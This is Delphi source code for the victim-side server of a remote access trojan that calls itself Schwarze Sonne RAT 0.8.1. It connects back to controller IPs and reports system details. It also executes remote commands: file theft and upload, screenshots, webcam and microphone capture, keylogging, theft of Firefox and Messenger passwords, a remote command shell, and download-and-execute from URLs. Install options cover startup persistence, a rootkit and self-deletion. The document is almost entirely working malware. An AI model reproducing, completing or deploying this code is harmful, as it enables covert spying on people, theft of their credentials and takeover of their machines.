  result := (connect(Sock, Addr, SizeOf(Addr)));
  if result = SOCKET_ERROR Then exit;
  T := '88|' + mutex + '|'  + sCount + '|' + #10;
  send(sock, t[1],length(T),0);
  sleep(1000);
  for i := 0 to tCount - 1 do begin
    if  mutex = plugins[i].szMutex then begin
      pluginfound := true;
      break;
    end;
  end;
  if pluginfound = false then begin
     T := '90|' + getpluginpath + '|'  + inttostr(cSock) + '|' + #10;
     send(sock, t[1],length(T),0);
  end;
  repeat
    Len := Recv(sock, Buf, SizeOf(Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(Buf);
    ZeroMemory(@Buf, SizeOf(Buf));
    if copy(data,1,4) = 'MESS' then begin
      delete(data,1,4);
      for i := 0 to tCount - 1 do begin
        if  mutex = plugins[i].szMutex then begin
          plugins[i].ReceiveData(sock,data);
          break;
        end;
      end;
    end;
  until 1 = 3;
    {$I+}
End;
Procedure EndProcess(dPID: String);
Var
  ProcessHandle :THandle;
Begin
  ProcessHandle := OpenProcess(PROCESS_TERMINATE, BOOL(0), StrToInt(dPID));
  TerminateProcess(ProcessHandle, 0);
End;

function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;


Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;
Procedure PingIt;
var
  sPingMess:string;
  dErr:integer;
Begin
sPingMess := 'PING|0' + #10;
dErr := send(serv.Sock,sPingMess[1],length(sPingMess),0);
If (dErr = 0) Then Exit;
End;
Function PrepIPs:string;
var
  i:integer;
begin
  result := '';
  for i := 0 to sIPList.Count -1 do begin
    result := result + siplist.Strings[i] + ',';
  end;
end;

Procedure TServer.ReceiveData;
Var
  Buffer: Array[0..1600] Of Char;
  Data: String;
  Mutex:integer;
  D: Dword;
  Len: Integer;
  Temp: String;
  Cmd: String;
  Param: Array[0..100]of String;
  FName: String;
  Fileman:TFilemanager;
  Registryman:TRegistryman;
  Service:TServices;
  Window:TWindows;
  mDOS:TDOS;
  szCurAppNm:array[0..260] of Char;
  lastone:string;
Begin
  serv.Sock := sock;
  Window := TWindows.create;
  mDOS := TDOS.Create;
  Service := TServices.Create;
  Registryman := TRegistryman.Create;
  Fileman := TFilemanager.Create;
  Repeat
    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    While (Pos(#10, Data) > 0) Do
    Begin
      Temp := Copy(Data, 1, Pos(#10, Data)-1);
      Delete(Data, 1, Pos(#10, Data));

      StripOutCmd(Temp, Cmd);
      StripOutParam(Temp, Param);

      Case StrToInt(Cmd) Of
        C_UNINSTALL     :begin
                          Installer.Uninstall(sock);
                         end;
        C_GETFILE       :Begin
                           Delete(Temp, 1, 3);
                           If (FileExists(Temp)) Then
                           Begin
                             FName := ExtractFileName(Temp);
                             Mutex := ((Random(9)+1)*1000)+Random(500);
                             Info.Name := Temp;
                             Info.Host := RemoteAddress(Sock);
                             Info.Port := Port;
                             info.Mutex := Mutex;
                             info.FileSize := getfilesize(Temp);
                             CreateThread(NIL, 0, @SendFile, @Info, 0, D);
                           End;
                         End;
        C_GETTHUMB       :Begin
                           If (FileExists(param[0])) Then
                           Begin
                             Info.Name := param[0];
                             Info.Host := RemoteAddress(Sock);
                             Info.Port := Port;
                             info.Mutex := strtoint(param[1]);
                             CreateThread(NIL, 0, @SendThumbnail, @Info, 0, D);
                           End;
                         End;
        C_PUTFILE       :Begin
                           Info.Name := Param[1];
                           Info.Host := RemoteAddress(Sock);
                           Info.Port := Port;
                           Info.Size := strtoint(Param[0]);
                           info.sFile := Param[2];
                           CreateThread(NIL, 0, @recvfile, @Info, 0, D);
                         End;
        C_GETSYMETRIC:senddata('98|' + inttostr(GetSystemMetrics(SM_CXSCREEN)) + '|' + inttostr(GetSystemMetrics(SM_CYSCREEN)) + '|' + #10);
        C_SCREENN:begin
                   info.host := RemoteAddress(Sock);
                   Info.Port := Port;
                   info.Mutex := strtoint(param[0]);
                   CreateThread(NIL, 0, @SendScreenShotN, @info, 0, D);
                 end;
        C_REQUESTDRIVE  :Begin
                          FName := IntToStr(C_REQUESTDRIVE)+'|'+ Fileman.GetDrivez + #10;
                          Send(Sock, FName[1], Length(FName), 0);
                        end;
        C_REQUESTLIST   :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           Filemanager.GenerateList(Temp, 1,sock);
                           Filemanager.GenerateList(Temp, 2,sock);
                           LastDir := IntToStr(C_CURRENTPATH) +'|'+Temp;
                           If LastDir <> '' Then
                             If (LastDir[Length(LastDir)] <> '\') Then LastDir := LastDir + '\';
                           LastDir := LastDir + #10;
                         End;
        C_CURRENTPATH   :Send(Sock, LastDir[1], Length(LastDir), 0);
        C_LEFTCLICK: begin
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        SetCursorPos(StrToInt(param[0]), StrToInt(param[1]));
                      end;
        C_RIGHTCLICK:  begin
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        SetCursorPos(StrToInt(param[0]), StrToInt(param[1]));
                      end;
        C_EXECUTE       :Begin
                           Temp := Copy(Temp, Pos(Param[1], Temp), Length(Temp));
                           ShellExecute(0, 'open', pChar(Temp), nil, nil, StrToInt(Param[0]));
                         End;
        C_DELETE        :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           DeleteFile(pChar(Temp));
                         End;
        C_PROCESSLIST   :Begin
                           ListProcess(StrToInt(Param[0]));
                         End;
        C_ENDPROCESS    :begin
                          EndProcess(Param[0]);
                        end;
        C_WEBCAM:begin
                 info.host := RemoteAddress(Sock);
                 Info.Port := Port;
                 info.Mutex := strtoint(param[0]);
                 //info.Size := strtoint(param[1]);
                 CreateThread(NIL, 0, @SendWebcams, @info, 0, D);
                 end;
        C_STOPWEBCAM:CloseWebcam;
        C_STARTKEYLOG:begin
            hookhandle := 1;
            if assigned(r) = false then senddata('33|Keylogger is deactivated!' + #10);
        end;
        C_STOPKEYLOG:begin
                      hookhandle := 0;
                     end;
        C_STOPSERV:begin
                    closesocket(Sock);
                    ExitProcess(0);
                   end;
        C_UNINSTALLSERV:begin
                         Installer.Uninstall(sock);
                        end;
        C_LISTREGKEY: begin
                        Registryman.ListarClaves(param[0],sock);
                        sleep(100);
                        Registryman.ListarValues(param[0],sock);
                      End;
        C_GETOFFKEYLOG:begin
                          info.host := RemoteAddress(Sock);
                          Info.Port := Port;
                          info.Mutex := strtoint(param[0]);
                          CreateThread(NIL, 0, @Sendkeylog, @info, 0, D);
                       end;
        C_GETMSNPASSW:
                      begin
                      SendData('44' + GetWindowsLiveMessengerPasswords + #10);
                      end;
        C_GETFFPASSW:
                      begin
                      SendData('43' + GetFireFoxPWD + #10);
                      end;
        C_LISTSERVICES:
                      begin
                      SendData('77' + service.ServiceList + #10);
                      end;
        C_LISTWINDOWS:
                      begin
                      SendData('95' + window.GetWindows + #10);
                      end;
        C_DELETEREGKEY: begin
                          Registryman.BorraClave(param[0]);
                        end;
        C_DOWNLOAD:begin
                    info.Host := Param[0];
                    Info.Port := Port;
                    info.Name := installer.GetCurrentDir + '\' + param[1];
                    createthread(nil,0,@ExecuteFileFromURL,@info, 0, D);
                   end;
         C_PLUGINCONN: begin
           info.Host := RemoteAddress(Sock);
           Info.Port := Port;
           info.Size := strtoint(param[2]);
           info.Name := param[0];
           info.Mutex := strtoint(param[1]);
           createthread(nil,0,@PluginThread,@info, 0, D);
         end;
         C_RESTART:Restart;
         C_CLOSEWIN:begin
                    window.CloseWindow(strtoint(param[0]));
                    sleep(200);
                    SendData('95' + window.GetWindows + #10);
                    end;
         C_MAXWIN: begin
                    window.Maximize(strtoint(param[0]));
                    end;
         C_MINWIN:begin
                    window.Minimize(strtoint(param[0]));
                  end;
         C_STARTSERVICE: begin
                          service.ServiceStatus(param[0],true,true);
                          end;
         C_STOPSERVICE: begin
                          service.ServiceStatus(param[0],true,false);
                        end;
         C_INFORMATION:begin
                       Temp := sID + '|' + inttostr(port) + '|' + PrepIPs + '|' +  password +'|';
                       temp := temp + installer.GetData + functions.GetInfos + #10;
                       senddata('300|' + temp);
                        end;
         C_SHELLACTIVE: mdos.StartThread(sock);
         C_SHELLEXECUT: mdos.WriteData(param[0] + #13 +#10);
         C_SHELLCLOSE: mdos.WriteData('exit' + #13 +#10);
         C_WINDOW:begin
                  GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
                  if lastone <> szCurAppNm then begin
                    lastone := szcurappnm;
                    Temp := '190|' + lastone + #10;
                    send(serv.Sock,Temp[1],length(Temp),0);
                  end;
                  end;
         C_AUDIOSTART:
                      BEGIN
                         info.host := RemoteAddress(Sock);
                         Info.Port := Port;
                         info.Mutex := strtoint(param[0]);

                         AudioCap.Mutex := info.Mutex;
                         AudioCap.Host  := info.Host;
                         AudioCap.Port  := info.Port;

                         WSAStartUp($0101,AudioCap.WSA);
                         AudioCap.Sock := Socket(AF_INET, SOCK_STREAM, 0);
                         AudioCap.Addr.sin_family := AF_INET;
                         AudioCap.Addr.sin_port := hTons(AudioCap.port);
                         AudioCap.Addr.sin_addr.S_addr := inet_Addr(pchar(AudioCap.Host));

                         WITH AUDIOCAP DO
                          BEGIN
                            Format.wFormatTag := StrToInt(param[1]);
                            Format.nChannels := StrToInt(param[2]);
                            Format.nSamplesPerSec := StrToInt(param[3]);
                            Format.nAvgBytesPerSec := StrToInt(param[4]);
                            Format.nBlockAlign := StrToInt(param[5]);
                            Format.wBitsPerSample := StrToInt(param[6]);
                            Format.cbSize := StrToInt(param[7]);
                            SesDoldu := False;
                            SesBilgisi := '';
                            ACMI.BufferSize                      := ACMC.InputBufferSize;
                            ACMC.FormatIn.Format.nChannels       := Format.nChannels;
                            ACMC.FormatIn.Format.nSamplesPerSec  := Format.nSamplesPerSec;
                            ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
                            ACMC.FormatIn.Format.nBlockAlign     := Format.nBlockAlign;
                            ACMC.FormatIn.Format.wBitsPerSample  := Format.wBitsPerSample;
                            ACMC.InputBufferSize                 := ACMC.FormatIn.Format.nAvgBytesPerSec;
                            ACMI.BufferSize                      := ACMC.InputBufferSize;
                        END;
                        CreateThread(NIL, 0, @SendAudioStream, @info, 0, D);
                     END;
        C_THUMBDESKTOP:
                      BEGIN
                             Info.Name := param[0];
                             Info.Host := RemoteAddress(Sock);
                             Info.Port := Port;
                             info.Mutex := strtoint(param[1]);
                             CreateThread(NIL, 0, @SendThumbnailDesktop, @Info, 0, D);
                      END;




       end;
    End;
  Until 1 = 2;
  Fileman.Free;
  Service.Free;
  Registryman.Free;
  Window.Free;
  CloseSocket(Sock);
End;




Procedure TServer.SendData(Text: String);
var
  dErr: Integer;
Begin
  dErr := Send(Sock, Text[1], Length(Text), 0);
  If (dErr = 0) Then Exit;
End;

Procedure TServer.Connect;
var
  sFunction:TFunctions;
  pt:integer;
  szCurAppNm:array[0..260] of Char;
Begin
  sFunction := tFunctions.Create;
  WSAStartUP($0202, WSA);
  Close := False;
  pt := -1;
  repeat
    if pt + 1 > sIplist.Count - 1 then begin
      pt := 0;
    end else begin
      pt := pt +1;
    end;
    Host := ResolveIP(sIPlist.Strings[pt]);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pChar(host));
    If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = 0) Then
    Begin
      GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
      if trim(szCurAppNm) = '' then szCurAppNm := '-';
      if ListCamDrivers <> '' then begin
        senddata('02|'+ sFunction.GetUserFromWindows + '@' + sFunction.GetComputerNetName + '|' + sFunction.GetOS + '|' + sFunction.GetWindowsLanguage + '|' + inttostr(trunc(sFunction.getcpuspeed)) +'|' +'Y|' + sID + '|' + sVer + '|' + szCurAppNm + '|' +#10);
      end else begin
        senddata('02|'+ sFunction.GetUserFromWindows + '@' + sFunction.GetComputerNetName + '|' + sFunction.GetOS + '|' + sFunction.GetWindowsLanguage + '|' + inttostr(trunc(sFunction.getcpuspeed)) +'|' +'N|' + sID + '|' + sVer + '|' + szCurAppNm + '|' +#10);
      end;
      ReceiveData;
    End;
    Sleep(10000);
    LastDir := '';
  until (Close);
  sFunction.Free;
  WSACleanUP();
End;

Procedure ReadFileStr(dName: String; Var Content: String);
Var
  FContents     : File Of Char;
  FBuffer       : Array [1..1024] Of Char;
  rLen          : LongInt;
  FSize         : LongInt;
Begin
  Try
    Content := '';
    AssignFile(FContents, dName);
    Reset(FContents);
    FSize := FileSize(FContents);
    While Not EOF(FContents) Do
    Begin
      BlockRead(FContents, FBuffer, 1024, rLen);
      Content := Content + String(FBuffer);
    End;
    CloseFile(FContents);
    If Length(Content) > FSize Then
      Content := Copy(Content, 1, FSize);
  Except
    Exit;
  End;
End;

Function EncryptText(Text: String): String;
Var
  I     :Word;
  C     :Word;
Begin
  Result := '';
  For I := 1 To Length(Text) Do
    Begin
      C := Ord(Text[I]);
      Result := Result + Chr((C Xor 12));
    End;
End;
procedure AddIPsToList(mString:string);
var
  tempstr:string;
begin
sIPList := TStringlist.Create;
repeat
tempstr := copy(mString,1,pos('****',mString) - 1) ;
if tempstr <> '' then sIPlist.Add(tempstr);
delete(mString,1,length(tempstr) + 4);
until mString = '';
end;
procedure LoadPlugins();
var
  WIN32:    TWin32FindData;
  hFile:    DWORD;
begin
  tCount := 0;
  hFile := FindFirstFile(PChar(GetPluginPath + '*'), WIN32);
  if hFile <> 0 then
  begin
    repeat
      if (string(WIN32.cFileName) <> '.') and (WIN32.cFileName <> '..') then begin
      SetLength(Plugins, tCount + 1);
      if copy(string(win32.cFileName),length(string(win32.cFileName)) -2,3) = 'srv' then begin
      PluginName := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginName');
      Plugins[tCount].szName := PluginName;
      PluginVersion := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginVersion');
      Plugins[tCount].szVersion := PluginVersion;
      PluginAuthor := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginAuthor');
      Plugins[tCount].szAuthor  := PluginAuthor ;
      PluginMutex := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginMutex');
      Plugins[tCount].szMutex := PluginMutex;
      Plugins[tCount].ReceiveData := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'ReceiveDatas');
      Plugins[tCount].Call := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginMain');
      Inc(tCount);
      end;
      end;
    until FindNextFile(hFile, WIN32) = FALSE;
    Windows.FindClose(hFile);
end;
end;

Procedure AudioCaptureMain;
BEGIN
    AudioCap := TAudio.Create;
    AudioCap.ACMC := TACMConvertor.Create;
    AudioCap.ACMI := TACMIn.Create;
    WITH AUDIOCAP DO
      BEGIN
        Format.wFormatTag := 0;
        Format.nChannels := 2;
        Format.nSamplesPerSec := 48000;
        Format.nAvgBytesPerSec := 192000;
        Format.nBlockAlign := 4;
        Format.wBitsPerSample := 16;
        Format.cbSize := 0;
        SesDoldu := False;
        SesBilgisi := '';
        ACMI.OnBufferFull                    := BufferFull;
        ACMI.BufferSize                      := ACMC.InputBufferSize;
        ACMC.FormatIn.Format.nChannels       := Format.nChannels;
        ACMC.FormatIn.Format.nSamplesPerSec  := Format.nSamplesPerSec;
        ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
        ACMC.FormatIn.Format.nBlockAlign     := Format.nBlockAlign;
        ACMC.FormatIn.Format.wBitsPerSample  := Format.wBitsPerSample;
        ACMC.InputBufferSize                 := ACMC.FormatIn.Format.nAvgBytesPerSec;
        ACMI.BufferSize                      := ACMC.InputBufferSize;
      END;
END;

procedure StartME;
begin
  Functionu := tFunctions.Create;
  Serv := TServer.Create;
  Serv.Connect;
end;
begin
  Installer:= TInstaller.Create;
  OutputDebugString(PChar('This is Schwarze Sonne RAT 0.8.1 by Slayer616!'));
  OutputDebugString(PChar('and counterstrikewi :) www.delphi.co.nr'));
  OutputDebugString(PChar('and ap0calypse :) www.cigicigi.com'));  
  sleep(2000);  //necessary for melt function
  if ReadSettings(sSettings) then begin
     SplitSettings(sSettings,sInstallParams);
     AddIPsToList(sinstallparams[0]);
     port := strtoint(sinstallparams[1]);
     password := sinstallparams[2];
     Installer.installdir := sinstallparams[3];
     Installer.installFilename := sinstallparams[4];
     Installer.HKCUStartup := sinstallparams[5];
     Installer.ActiveXStartup := sinstallparams[6];
     sID := sinstallparams[15];
     if sinstallparams[7] = '1' then Installer.sInstallme := True else Installer.sInstallme := False;
     if sInstallParams[8] = '1' then Installer.sStartupme := True else Installer.sStartupme := False;
     if sInstallParams[9] = '1' then Installer.sActiveX := True else Installer.sActiveX := False;
     if sInstallParams[10] = '1' then Installer.sHCKUStart := True else Installer.sHCKUStart := False;
     CreateMutex(nil, true, PChar(sInstallParams[11]) );
     if GetLastError = ERROR_ALREADY_EXISTS then begin
        ExitProcess(0);
     end;
     installer.mutx := sInstallParams[11];
     if sInstallParams[12] = '1' then Installer.sunhook := true else Installer.sunhook := False;
     if sInstallParams[13] = '1' then Installer.sMelt := true else Installer.sMelt := False;
     if sInstallParams[14] = '1' then Installer.sKeylogger := true else Installer.sKeylogger := False;
     if sInstallParams[16] = '1' then Installer.sRootkit := true else Installer.sRootkit := False;
     if sInstallParams[17] = '1' then Installer.sPersistance := true else Installer.sPersistance := False;
     Installer.sDllName := Dllname;
     Installer.Install;
  end else begin
    AddIPsToList('127.0.0.1****');
  end;
  AudioCaptureMain;
  hookhandle := 0;
  sKeyloggerThread := INVALID_HANDLE_VALUE;
  LoadPlugins;
  CreateThread(nil,0,@startme,nil,0,sKeyloggerThread);
  If Installer.sKeylogger then serv.KeyloggerStart;
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
  Halt(Msg.wParam);
end.
